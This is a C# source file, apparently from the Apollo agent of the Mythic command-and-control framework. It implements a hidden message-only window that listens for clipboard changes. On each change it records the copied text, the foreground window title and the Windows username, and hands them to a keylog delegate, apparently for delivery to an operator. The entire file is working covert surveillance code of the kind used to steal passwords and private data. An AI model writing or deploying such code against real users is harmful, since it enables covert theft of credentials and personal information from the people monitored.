using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static KeylogInject.Delegates;
using static KeylogInject.Native;

namespace KeylogInject
{
    public sealed class ClipboardNotification : Form
    {
        private static string _username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        public static PushKeylog LogMessage;
        string lastWindow = "";
        string lastClipboard = "";
        public ClipboardNotification()
        {
            //Turn the child window into a message-only window (refer to Microsoft docs)
            SetParent(Handle, HWND_MESSAGE);
            //Place window in the system-maintained clipboard format listener list
            AddClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            try
            {
                //Listen for operating system messages
                if (m.Msg == WM_CLIPBOARDUPDATE)
                {

                    //Write to stdout active window
                    IntPtr active_window = GetForegroundWindow();
                    if (active_window != IntPtr.Zero && active_window != null)
                    {
                        int length = GetWindowTextLength(active_window);
                        StringBuilder sb = new StringBuilder(length + 1);
                        GetWindowText(active_window, sb, sb.Capacity);
                        string clipboardMessage = "";
                        string curWindow = sb.ToString();
                        try
                        {
                            clipboardMessage = $"[ctrl-C] Clipboard Copied: {Clipboard.GetText()}[/ctrl-C]";
                        }
                        catch (Exception ex)
                        {
                            clipboardMessage = "[ERROR]Couldn't get text from clipboard.[/ERROR]";
                        }
                        if (clipboardMessage != lastClipboard || lastWindow != curWindow)
                        {
                            lastClipboard = clipboardMessage;
                            lastWindow = curWindow;
                            LogMessage(new ApolloInterop.Structs.MythicStructs.KeylogInformation
                            {
                                Username = _username,
                                WindowTitle = sb.ToString(),
                                Keystrokes = clipboardMessage
                            });
                        }
                    }
                }
                //Called for any unhandled messages
                base.WndProc(ref m);
            }
            catch (Exception ex)
            {
                //Console.WriteLine("[X] Error in WndProc: {0}", ex.Message);
                //Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
            }
        }

    }
}
